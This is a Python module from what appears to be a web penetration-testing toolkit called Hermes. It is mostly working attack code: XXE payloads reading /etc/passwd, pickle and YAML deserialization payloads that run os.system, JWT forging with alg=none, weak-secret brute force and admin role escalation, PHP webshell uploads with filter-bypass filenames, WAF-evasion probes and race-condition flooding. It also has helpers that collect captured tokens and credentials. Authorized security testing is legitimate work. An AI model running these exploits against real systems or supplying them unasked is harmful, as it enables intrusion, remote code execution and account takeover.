"""
Hermes Security Testing Engine - Advanced Modules

Extends security_engine.py with:
- Additional vulnerability tests (XXE, deserialization, race conditions, JWT, file upload)
- Defense detection (WAF, rate limit, input filter fingerprinting)
- Chain exploitation helpers (use findings from one test to feed another)
- Structured reporting

Usage (after loading security_engine.py and quick_test.py):
    exec(open(".../advanced_tests.py").read())

    # Defense detection
    defenses = detect_defenses("http://target/")

    # Race condition
    test_race_condition("http://target/redeem", data={"code": "X"}, workers=50)

    # XXE
    test_xxe("http://target/parse")

    # Deserialization (Python pickle)
    test_pickle_deserialization("http://target/import", param_name="data")

    # JWT attacks
    test_jwt_attacks("http://target/api", token="eyJ...")

    # Generate report
    print(generate_report(scanner))
"""

import requests
import time
import base64
import json
import pickle
import re
import os
import concurrent.futures
from datetime import datetime


# ============================================================================
# Defense Detection
# ============================================================================

def detect_defenses(base_url, paths=None):
    """Fingerprint WAFs, rate limits, and input filters."""
    if paths is None:
        paths = ["/", "/admin", "/api", "/login"]

    defenses = {
        "waf": None,
        "rate_limit": None,
        "input_filters": [],
        "security_headers": {},
        "evidence": []
    }

    session = requests.Session()
    print(f"[*] Detecting defenses on {base_url}")

    # 1. WAF Fingerprinting via header inspection
    try:
        r = session.get(base_url, timeout=5)
        for header, value in r.headers.items():
            h_lower = header.lower()
            v_lower = str(value).lower()

            if 'cf-ray' in h_lower or 'cloudflare' in v_lower:
                defenses["waf"] = "Cloudflare"
            elif 'x-amzn' in h_lower or 'awselb' in v_lower or 'x-amz-cf-id' in h_lower:
                defenses["waf"] = "AWS WAF / CloudFront"
            elif 'akamai' in v_lower or 'x-akamai' in h_lower:
                defenses["waf"] = "Akamai"
            elif 'x-sucuri' in h_lower:
                defenses["waf"] = "Sucuri"
            elif 'incap_ses' in v_lower or 'visid_incap' in v_lower:
                defenses["waf"] = "Imperva Incapsula"
            elif 'x-iinfo' in h_lower:
                defenses["waf"] = "Imperva"
            elif 'mod_security' in v_lower or 'modsecurity' in v_lower:
                defenses["waf"] = "ModSecurity"

        # Security headers audit
        sec_headers = [
            'Strict-Transport-Security', 'Content-Security-Policy',
            'X-Frame-Options', 'X-Content-Type-Options',
            'Referrer-Policy', 'Permissions-Policy',
            'X-XSS-Protection'
        ]
        for h in sec_headers:
            defenses["security_headers"][h] = r.headers.get(h, "MISSING")
    except Exception as e:
        defenses["evidence"].append(f"Header check failed: {e}")

    # 2. WAF probe — send a known malicious payload
    waf_probes = [
        ("?x=<script>alert(1)</script>", "XSS"),
        ("?x=' OR 1=1--", "SQLi"),
        ("?x=../../../etc/passwd", "LFI"),
        ("?x=$(id)", "CMDi"),
    ]
    for path in paths[:1]:  # Just hit root with probes
        for payload, vtype in waf_probes:
            try:
                r = session.get(base_url.rstrip('/') + path + payload, timeout=5)
                if r.status_code in (403, 406, 429, 501):
                    defenses["evidence"].append(f"{vtype} probe → {r.status_code} (likely blocked)")
                    if not defenses["waf"]:
                        defenses["waf"] = "Generic WAF (status-based detection)"
                # Body indicators
                body_lower = r.text.lower()[:2000]
                for indicator, name in [
                    ("blocked by", "Generic"),
                    ("access denied", "Generic"),
                    ("request blocked", "Generic"),
                    ("cloudflare", "Cloudflare"),
                    ("attention required", "Cloudflare"),
                    ("/cdn-cgi/", "Cloudflare"),
                    ("akamai", "Akamai"),
                    ("the requested url was rejected", "F5 BIG-IP ASM"),
                ]:
                    if indicator in body_lower:
                        defenses["waf"] = name
                        defenses["evidence"].append(f"Body match: '{indicator}' on {vtype} probe")
                        break
            except Exception:
                pass

    # 3. Rate limit detection — send rapid bursts
    print(f"[*] Probing rate limit...")
    try:
        burst_results = []
        start = time.time()
        for i in range(20):
            r = session.get(base_url, timeout=3)
            burst_results.append(r.status_code)
            if r.status_code == 429:
                defenses["rate_limit"] = f"Triggered after {i+1} requests in {time.time()-start:.2f}s"
                break
        if not defenses["rate_limit"]:
            defenses["rate_limit"] = "No 429 in 20 burst requests"
    except Exception as e:
        defenses["evidence"].append(f"Rate limit probe failed: {e}")

    # 4. Input filter detection — see what gets stripped
    print(f"[*] Probing input filters...")
    test_chars = {
        "single_quote": "'",
        "double_quote": '"',
        "less_than": "<",
        "greater_than": ">",
        "ampersand": "&",
        "pipe": "|",
        "semicolon": ";",
        "backtick": "`",
        "parens": "()",
        "braces": "{}",
        "newline": "\n",
        "null_byte": "\x00",
    }
    try:
        # Use a simple reflection probe
        marker = "ZXTESTZX"
        for name, char in test_chars.items():
            payload = f"{marker}{char}{marker}"
            r = session.get(base_url, params={"q": payload}, timeout=3)
            # Check if our marker bracket survived
            if marker in r.text:
                # Extract reflected content between markers
                m = re.search(re.escape(marker) + r"(.*?)" + re.escape(marker), r.text, re.DOTALL)
                if m and m.group(1) != char:
                    defenses["input_filters"].append({
                        "char": name,
                        "original": repr(char),
                        "reflected_as": repr(m.group(1))
                    })
    except Exception:
        pass

    # Summary
    print(f"[*] WAF: {defenses['waf'] or 'None detected'}")
    print(f"[*] Rate limit: {defenses['rate_limit']}")
    print(f"[*] Input filters detected: {len(defenses['input_filters'])}")
    missing_sec = [k for k, v in defenses["security_headers"].items() if v == "MISSING"]
    if missing_sec:
        print(f"[*] Missing security headers: {', '.join(missing_sec)}")

    return defenses


# ============================================================================
# Race Conditions
# ============================================================================

def test_race_condition(url, data=None, json_body=None, method="POST",
                        workers=30, total_requests=30, success_pattern=None,
                        headers=None):
    """
    Test for race condition vulnerabilities by firing concurrent requests.

    Returns: dict with status_distribution, success_count, total_time, raced
    """
    if data is None and json_body is None:
        raise ValueError("Provide either data= or json_body=")

    print(f"[*] Race test: {workers} workers, {total_requests} requests → {url}")
    session = requests.Session()

    def fire():
        try:
            t0 = time.time()
            kwargs = {"timeout": 10}
            if headers:
                kwargs["headers"] = headers
            if json_body is not None:
                kwargs["json"] = json_body
            else:
                kwargs["data"] = data
            r = session.request(method, url, **kwargs)
            return {
                "status": r.status_code,
                "length": len(r.text),
                "body": r.text[:500],
                "elapsed": time.time() - t0
            }
        except Exception as e:
            return {"status": 0, "error": str(e), "elapsed": 0, "length": 0, "body": ""}

    start = time.time()
    with concurrent.futures.ThreadPoolExecutor(max_workers=workers) as ex:
        results = list(ex.map(lambda _: fire(), range(total_requests)))
    elapsed = time.time() - start

    # Analyze
    status_dist = {}
    for r in results:
        status_dist[r["status"]] = status_dist.get(r["status"], 0) + 1

    success_count = 0
    if success_pattern:
        success_count = sum(1 for r in results if success_pattern in r.get("body", ""))
    else:
        # Default: any 2xx counts as success
        success_count = sum(1 for r in results if 200 <= r["status"] < 300)

    raced = success_count > 1

    print(f"[*] Done in {elapsed:.2f}s")
    print(f"[*] Status distribution: {status_dist}")
    print(f"[*] Successful responses: {success_count}/{total_requests}")
    if raced:
        print(f"[!] RACE CONDITION LIKELY — {success_count} successes on operation expected to be atomic")

    return {
        "status_distribution": status_dist,
        "success_count": success_count,
        "total_requests": total_requests,
        "total_time": elapsed,
        "raced": raced,
        "first_success": next((r for r in results if 200 <= r.get("status", 0) < 300), None)
    }


# ============================================================================
# XXE
# ============================================================================

def test_xxe(url, method="POST", content_type="application/xml"):
    """Test an XML endpoint for XXE."""
    print(f"[*] Testing XXE on {url}")
    session = requests.Session()

    # Baseline — plain XML
    baseline_xml = "<?xml version='1.0'?><root><test>hello</test></root>"
    try:
        baseline = session.request(method, url, data=baseline_xml,
                                   headers={"Content-Type": content_type}, timeout=5)
        print(f"[*] Baseline: status={baseline.status_code}, length={len(baseline.text)}")
    except Exception as e:
        print(f"[!] Baseline failed: {e}")
        return []

    payloads = {
        "external_passwd": '''<?xml version="1.0"?>
<!DOCTYPE root [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
<root>&xxe;</root>''',
        "external_hostname": '''<?xml version="1.0"?>
<!DOCTYPE root [<!ENTITY xxe SYSTEM "file:///etc/hostname">]>
<root>&xxe;</root>''',
        "php_filter_b64": '''<?xml version="1.0"?>
<!DOCTYPE root [<!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=/etc/passwd">]>
<root>&xxe;</root>''',
        "parameter_entity": '''<?xml version="1.0"?>
<!DOCTYPE root [<!ENTITY % file SYSTEM "file:///etc/passwd"><!ENTITY % all "<!ENTITY exfil SYSTEM 'file:///etc/passwd'>">%all;]>
<root>&exfil;</root>''',
    }

    results = []
    for name, payload in payloads.items():
        try:
            r = session.request(method, url, data=payload,
                                headers={"Content-Type": content_type}, timeout=10)
            confirmed = False
            indicators = []

            if "root:" in r.text and "/bin/" in r.text:
                confirmed = True
                indicators.append("/etc/passwd content reflected")
            elif "cm9vdDp4OjA6MDpyb290" in r.text:  # base64 of "root:x:0:0:root"
                confirmed = True
                indicators.append("base64-encoded /etc/passwd reflected")
            elif r.status_code != baseline.status_code:
                indicators.append(f"status changed: {baseline.status_code}→{r.status_code}")
            elif len(r.text) != len(baseline.text):
                indicators.append(f"length changed: {len(baseline.text)}→{len(r.text)}")

            if confirmed:
                print(f"[!] XXE CONFIRMED: {name}")
                for ind in indicators:
                    print(f"    - {ind}")
            elif indicators:
                print(f"[?] {name}: {indicators}")
            else:
                print(f"[-] No change: {name}")

            results.append({"payload": name, "confirmed": confirmed,
                            "indicators": indicators, "status": r.status_code})
        except Exception as e:
            print(f"[!] {name} failed: {e}")

    return results


# ============================================================================
# Insecure Deserialization
# ============================================================================

def test_pickle_deserialization(url, method="POST", param_name="data",
                                marker="DRTBP_DESERIAL_MARKER", as_json=False):
    """
    Test for Python pickle deserialization vulnerability.
    Uses a benign marker (touches /tmp/marker file) instead of real RCE.
    """
    print(f"[*] Testing Python pickle deserialization on {url}")
    session = requests.Session()

    marker_file = f"/tmp/{marker}_{int(time.time())}"

    class Probe:
        def __reduce__(self):
            import os
            return (os.system, (f"touch {marker_file}",))

    payloads = {
        "raw_pickle": pickle.dumps(Probe()),
        "base64_pickle": base64.b64encode(pickle.dumps(Probe())).decode(),
        "hex_pickle": pickle.dumps(Probe()).hex(),
    }

    results = []
    for name, payload in payloads.items():
        try:
            if as_json:
                r = session.request(method, url, json={param_name: payload}, timeout=5)
            elif method.upper() == "POST":
                r = session.request(method, url, data={param_name: payload}, timeout=5)
            else:
                r = session.request(method, url, params={param_name: payload}, timeout=5)

            time.sleep(0.5)  # Let the file write happen
            confirmed = os.path.exists(marker_file)
            if confirmed:
                print(f"[!] DESERIALIZATION RCE CONFIRMED: {name}")
                print(f"    Marker file created: {marker_file}")
                # Clean up marker
                try:
                    os.remove(marker_file)
                except Exception:
                    pass
            else:
                print(f"[-] No execution: {name} (status={r.status_code}, len={len(r.text)})")

            results.append({"payload": name, "confirmed": confirmed, "status": r.status_code})
        except Exception as e:
            print(f"[!] {name} failed: {e}")

    return results


def test_yaml_deserialization(url, method="POST", param_name="data"):
    """Test for YAML deserialization (PyYAML unsafe_load)."""
    print(f"[*] Testing YAML deserialization on {url}")
    session = requests.Session()

    marker_file = f"/tmp/yaml_marker_{int(time.time())}"

    payloads = {
        "python_object_apply": f"!!python/object/apply:os.system ['touch {marker_file}']",
        "python_object_new": f"!!python/object/new:os.system [touch {marker_file}]",
    }

    results = []
    for name, payload in payloads.items():
        try:
            if method.upper() == "POST":
                r = session.request(method, url, data={param_name: payload}, timeout=5)
            else:
                r = session.request(method, url, params={param_name: payload}, timeout=5)

            time.sleep(0.5)
            confirmed = os.path.exists(marker_file)
            if confirmed:
                print(f"[!] YAML DESERIALIZATION RCE CONFIRMED: {name}")
                try:
                    os.remove(marker_file)
                except Exception:
                    pass
            else:
                print(f"[-] No execution: {name} (status={r.status_code})")

            results.append({"payload": name, "confirmed": confirmed, "status": r.status_code})
        except Exception as e:
            print(f"[!] {name} failed: {e}")

    return results


# ============================================================================
# JWT Attacks
# ============================================================================

def _b64url_decode(s):
    pad = '=' * (-len(s) % 4)
    return base64.urlsafe_b64decode(s + pad)


def _b64url_encode(b):
    return base64.urlsafe_b64encode(b).rstrip(b'=').decode()


def decode_jwt(token):
    """Decode a JWT without verification — show header, payload, signature."""
    parts = token.split('.')
    if len(parts) != 3:
        return None
    try:
        header = json.loads(_b64url_decode(parts[0]))
        payload = json.loads(_b64url_decode(parts[1]))
        return {"header": header, "payload": payload, "signature": parts[2]}
    except Exception as e:
        return {"error": str(e)}


def forge_jwt_alg_none(payload):
    """Forge a JWT with alg=none."""
    header = {"alg": "none", "typ": "JWT"}
    h = _b64url_encode(json.dumps(header, separators=(',', ':')).encode())
    p = _b64url_encode(json.dumps(payload, separators=(',', ':')).encode())
    return f"{h}.{p}."


def forge_jwt_hs256(payload, secret):
    """Forge a JWT signed with HS256 using `secret` (bytes or str)."""
    import hmac, hashlib
    if isinstance(secret, str):
        secret = secret.encode()
    header = {"alg": "HS256", "typ": "JWT"}
    h = _b64url_encode(json.dumps(header, separators=(',', ':')).encode())
    p = _b64url_encode(json.dumps(payload, separators=(',', ':')).encode())
    signing_input = f"{h}.{p}".encode()
    sig = hmac.new(secret, signing_input, hashlib.sha256).digest()
    return f"{h}.{p}.{_b64url_encode(sig)}"


def test_jwt_attacks(url, token, verify_endpoint=None, header_name="Authorization",
                    header_prefix="Bearer "):
    """
    Test JWT attacks: alg=none, alg=HS256-with-public-key.
    `url` is the endpoint we're trying to bypass auth on.
    `verify_endpoint` (optional) is a token verification endpoint to test forged tokens.
    """
    print(f"[*] Testing JWT attacks on {url}")
    session = requests.Session()

    decoded = decode_jwt(token)
    if not decoded or "error" in decoded:
        print(f"[!] Could not decode token: {decoded}")
        return []
    print(f"[*] Original header: {decoded['header']}")
    print(f"[*] Original payload: {decoded['payload']}")

    # Build attack payloads — escalate role
    base_payload = dict(decoded['payload'])
    escalated = dict(base_payload)
    for k in ['role', 'roles']:
        if k in escalated:
            escalated[k] = 'admin'
    escalated['role'] = 'admin'
    escalated['is_admin'] = True
    escalated['admin'] = True

    test_target = verify_endpoint or url

    # Attack 1: alg=none
    none_token = forge_jwt_alg_none(escalated)
    print(f"\n[*] Attack 1: alg=none")
    try:
        r = session.get(test_target, headers={header_name: header_prefix + none_token}, timeout=5)
        if r.status_code == 200 and "admin" in r.text.lower():
            print(f"[!] alg=none ACCEPTED — server allows unsigned tokens")
        else:
            print(f"[-] alg=none rejected (status={r.status_code})")
    except Exception as e:
        print(f"[!] alg=none probe failed: {e}")

    # Attack 2: HS256 with empty secret
    hs256_empty = forge_jwt_hs256(escalated, "")
    print(f"\n[*] Attack 2: HS256 with empty secret")
    try:
        r = session.get(test_target, headers={header_name: header_prefix + hs256_empty}, timeout=5)
        if r.status_code == 200 and "admin" in r.text.lower():
            print(f"[!] HS256 with empty secret ACCEPTED")
        else:
            print(f"[-] HS256 empty rejected (status={r.status_code})")
    except Exception as e:
        print(f"[!] HS256 empty probe failed: {e}")

    # Attack 3: HS256 with weak secrets (try common ones)
    print(f"\n[*] Attack 3: HS256 with weak secret bruteforce (top 10)")
    weak_secrets = ["secret", "password", "key", "jwt", "admin", "test", "12345",
                    "your-256-bit-secret", "default", "changeme"]
    for sec in weak_secrets:
        forged = forge_jwt_hs256(escalated, sec)
        try:
            r = session.get(test_target, headers={header_name: header_prefix + forged}, timeout=3)
            if r.status_code == 200 and ("admin" in r.text.lower() or len(r.text) > 100):
                print(f"[!] HS256 with secret '{sec}' ACCEPTED")
                break
        except Exception:
            continue
    else:
        print(f"[-] No weak secret matched")

    return {"none": none_token, "hs256_empty": hs256_empty, "decoded": decoded}


# ============================================================================
# File Upload
# ============================================================================

def test_file_upload(url, file_field="file", method="POST"):
    """Test a file upload endpoint with bypass variants."""
    print(f"[*] Testing file upload on {url}")
    session = requests.Session()

    # PHP webshell payloads with various bypasses
    payloads = {
        "plain_php": ("shell.php", b"<?php system($_GET['c']); ?>", "application/x-php"),
        "php3": ("shell.php3", b"<?php system($_GET['c']); ?>", "application/x-php"),
        "phtml": ("shell.phtml", b"<?php system($_GET['c']); ?>", "application/x-php"),
        "phar": ("shell.phar", b"<?php system($_GET['c']); ?>", "application/x-php"),
        "double_ext": ("shell.php.jpg", b"<?php system($_GET['c']); ?>", "image/jpeg"),
        "gif_magic": ("shell.php", b"GIF89a;\n<?php system($_GET['c']); ?>", "image/gif"),
        "case_variant": ("shell.PhP", b"<?php system($_GET['c']); ?>", "application/x-php"),
        "null_byte": ("shell.php\x00.jpg", b"<?php system($_GET['c']); ?>", "image/jpeg"),
        "fake_image_jpg": ("shell.jpg", b"\xff\xd8\xff\xe0<?php system($_GET['c']); ?>", "image/jpeg"),
    }

    results = []
    for name, (filename, content, ctype) in payloads.items():
        try:
            files = {file_field: (filename, content, ctype)}
            r = session.request(method, url, files=files, timeout=10)
            status = r.status_code
            body = r.text[:300]

            # Look for path/URL in response
            url_match = re.search(r'(?:path|url|uploaded_to|file)["\']?\s*[:=]\s*["\']?([^"\'\s]+)', body, re.IGNORECASE)
            stored_at = url_match.group(1) if url_match else None

            accepted = status in (200, 201) and "error" not in body.lower()[:200]
            indicator = "ACCEPTED" if accepted else "rejected"
            print(f"[{'!' if accepted else '-'}] {name} → {status} {indicator}" +
                  (f"  stored: {stored_at}" if stored_at else ""))

            results.append({
                "payload": name,
                "filename": filename,
                "status": status,
                "accepted": accepted,
                "stored_at": stored_at
            })
        except Exception as e:
            print(f"[!] {name} failed: {e}")

    return results


# ============================================================================
# Chain Exploitation Helpers
# ============================================================================

class ChainContext:
    """Carries findings from one exploit to feed the next."""

    def __init__(self):
        self.tokens = {}        # name → token
        self.cookies = {}       # name → cookie value
        self.credentials = []   # list of (user, pass) pairs
        self.endpoints = []     # discovered endpoints
        self.findings = []      # vulnerabilities found
        self.session = requests.Session()

    def add_token(self, name, token, source=""):
        self.tokens[name] = token
        self.findings.append({"type": "token", "name": name, "value": token[:50],
                              "source": source})
        print(f"[+] Token captured: {name} (source: {source})")

    def add_credential(self, user, password, source=""):
        self.credentials.append({"user": user, "password": password, "source": source})
        self.findings.append({"type": "credential", "user": user, "source": source})
        print(f"[+] Credential captured: {user} (source: {source})")

    def add_finding(self, vuln_type, endpoint, details):
        self.findings.append({
            "type": vuln_type,
            "endpoint": endpoint,
            "details": details,
            "timestamp": datetime.now().isoformat()
        })

    def try_endpoints_with_token(self, token_name, endpoints, base_url):
        """Try a list of endpoints with a captured token to find auth bypasses."""
        if token_name not in self.tokens:
            print(f"[!] No token named {token_name}")
            return []
        token = self.tokens[token_name]
        results = []
        print(f"[*] Trying {len(endpoints)} endpoints with token {token_name}")
        for ep in endpoints:
            full_url = base_url.rstrip('/') + ep
            for header_format in [
                {"Authorization": f"Bearer {token}"},
                {"X-Auth-Token": token},
                {"Cookie": f"admin_token={token}"},
            ]:
                try:
                    r = self.session.get(full_url, headers=header_format, timeout=5)
                    if r.status_code == 200 and len(r.text) > 100:
                        print(f"[+] {ep} accepted with {list(header_format.keys())[0]} → {r.status_code}")
                        results.append({"endpoint": ep, "header": header_format,
                                        "status": r.status_code, "length": len(r.text)})
                        break
                except Exception:
                    continue
        return results


# ============================================================================
# Reporting
# ============================================================================

def generate_report(scanner_or_findings, target=None, format="markdown"):
    """
    Generate a structured report from scanner findings.
    Accepts either a SecurityScanner instance or a list of findings.
    """
    if hasattr(scanner_or_findings, 'findings'):
        findings = scanner_or_findings.findings
        target = target or getattr(scanner_or_findings, 'base_url', 'unknown')
        history = getattr(scanner_or_findings, 'test_history', [])
    elif isinstance(scanner_or_findings, list):
        findings = scanner_or_findings
        history = []
    else:
        findings = []
        history = []

    if format == "json":
        return json.dumps({
            "target": target,
            "generated_at": datetime.now().isoformat(),
            "findings_count": len(findings),
            "findings": findings,
            "test_history": history
        }, indent=2, default=str)

    # Markdown report
    lines = []
    lines.append(f"# Security Assessment Report")
    lines.append(f"")
    lines.append(f"**Target:** {target}")
    lines.append(f"**Generated:** {datetime.now().isoformat()}")
    lines.append(f"**Findings:** {len(findings)}")
    lines.append(f"**Tests run:** {len(history)}")
    lines.append(f"")

    # Group findings by indicator type
    by_indicator = {}
    for f in findings:
        for ind in f.get("indicators", []) or [f.get("type", "unknown")]:
            by_indicator.setdefault(ind, []).append(f)

    if not findings:
        lines.append(f"## Summary")
        lines.append(f"")
        lines.append(f"No vulnerabilities detected.")
        return "\n".join(lines)

    lines.append(f"## Summary")
    lines.append(f"")
    lines.append(f"| Indicator | Count |")
    lines.append(f"|:----------|:------|")
    for ind, items in sorted(by_indicator.items(), key=lambda x: -len(x[1])):
        lines.append(f"| {ind} | {len(items)} |")
    lines.append(f"")

    # Severity mapping
    severity_map = {
        "command_output": "CRITICAL",
        "file_contents": "HIGH",
        "xxe_triggered": "HIGH",
        "sql_error": "HIGH",
        "ssti_evaluated": "HIGH",
        "auth_bypass": "HIGH",
        "info_leak": "MEDIUM",
        "redirect": "LOW",
        "cookie_set": "INFO",
    }

    lines.append(f"## Findings")
    lines.append(f"")
    for i, f in enumerate(findings, 1):
        indicators = f.get("indicators", [])
        max_sev = "INFO"
        sev_order = {"INFO": 0, "LOW": 1, "MEDIUM": 2, "HIGH": 3, "CRITICAL": 4}
        for ind in indicators:
            s = severity_map.get(ind, "INFO")
            if sev_order.get(s, 0) > sev_order.get(max_sev, 0):
                max_sev = s

        lines.append(f"### Finding #{i}: {max_sev} — {f.get('type', 'vulnerability')}")
        lines.append(f"")
        lines.append(f"- **Endpoint:** `{f.get('endpoint', 'N/A')}`")
        lines.append(f"- **Method:** {f.get('method', 'N/A')}")
        lines.append(f"- **Payload:** `{f.get('payload', 'N/A')}`")
        if indicators:
            lines.append(f"- **Indicators:** {', '.join(indicators)}")
        if f.get('details'):
            lines.append(f"- **Details:**")
            for d in f['details']:
                lines.append(f"  - {d}")
        lines.append(f"")

    return "\n".join(lines)


def save_report(scanner_or_findings, output_path=None, format="markdown"):
    """Save a report to disk and return the path."""
    if output_path is None:
        ts = datetime.now().strftime("%Y%m%d_%H%M%S")
        ext = "json" if format == "json" else "md"
        output_path = os.path.expanduser(f"~/.hermes/security_reports/report_{ts}.{ext}")

    os.makedirs(os.path.dirname(output_path), exist_ok=True)
    report = generate_report(scanner_or_findings, format=format)
    with open(output_path, 'w') as f:
        f.write(report)
    print(f"[*] Report saved to {output_path}")
    return output_path
